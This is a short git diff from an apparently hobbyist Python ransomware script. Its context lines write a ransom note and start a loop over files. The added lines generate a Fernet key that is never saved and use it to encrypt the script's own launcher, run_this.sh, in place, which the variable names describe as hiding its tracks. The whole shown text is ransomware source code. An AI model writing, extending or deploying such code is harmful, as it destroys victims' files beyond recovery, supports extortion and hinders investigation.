@@ -23,6 +23,13 @@ note = "Give me many bonanas."
 
 with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
+hideur = Fernet.generate_key()
+
+with open("run_this.sh", "rb") as hide_ur_tracks:
+    contents = hide_ur_tracks.read()
+    contents_encrypted = Fernet(hideur).encrypt(contents)
+with open("run_this.sh", "wb") as hide_ur_tracks:
+    hide_ur_tracks.write(contents_encrypted)
 
 
 for file in files:
